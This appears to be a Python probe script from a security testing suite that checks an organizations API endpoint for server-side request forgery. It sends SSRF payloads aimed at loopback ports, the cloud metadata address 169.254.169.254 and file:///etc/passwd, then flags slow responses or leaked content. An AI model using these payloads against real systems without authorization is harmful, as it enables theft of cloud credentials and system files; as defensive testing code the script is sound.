"""
Probe script to test Server-Side Request Forgery (SSRF).
"""

import sys
import httpx
import asyncio
from .base_probe import BaseProbe, parse_args, run_probe, ProbeResult


class SSRFProbe(BaseProbe):
    async def run(self):
        print(f"[*] Starting SSRF Probe against {self.base_url}...", file=sys.stderr)
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            await self.check_ssrf_contract(client)

    async def check_ssrf_contract(self, client):
        """Check SSRF in business organization fields."""
        endpoint = "/api/business/organizations"

        ssrf_payloads = [
            "http://127.0.0.1:80",
            "http://localhost:22",
            "http://169.254.169.254/latest/meta-data/",
            "file:///etc/passwd"
        ]

        for payload in ssrf_payloads:
            result = ProbeResult("SSRF in Metadata", endpoint)

            data = {
                "org_id": f"ssrf-org-{abs(hash(payload))}",
                "ca_config": {"source_url": payload, "webhook": payload}
            }

            try:
                start = asyncio.get_running_loop().time()
                response = await client.post(
                    f"{self.base_url}{endpoint}",
                    headers=self.get_headers(),
                    json=data
                )
                duration = (asyncio.get_running_loop().time() - start) * 1000
                result.elapsed_ms = duration
                result.status_code = response.status_code

                if duration > 2000:
                    result.add_finding(
                        "medium",
                        f"Response took {duration:.0f}ms with payload {payload} (Possible Time-based SSRF)"
                    )

                if "aws" in response.text.lower() or "root:" in response.text:
                    result.add_finding(
                        "critical",
                        f"Response body suggests SSRF success with payload: {payload}"
                    )

            except Exception as e:
                result.error = str(e)

            if result.findings:
                self.results.append(result)

if __name__ == "__main__":
    args = parse_args("Verify SSRF defenses")
    asyncio.run(run_probe(SSRFProbe, args))
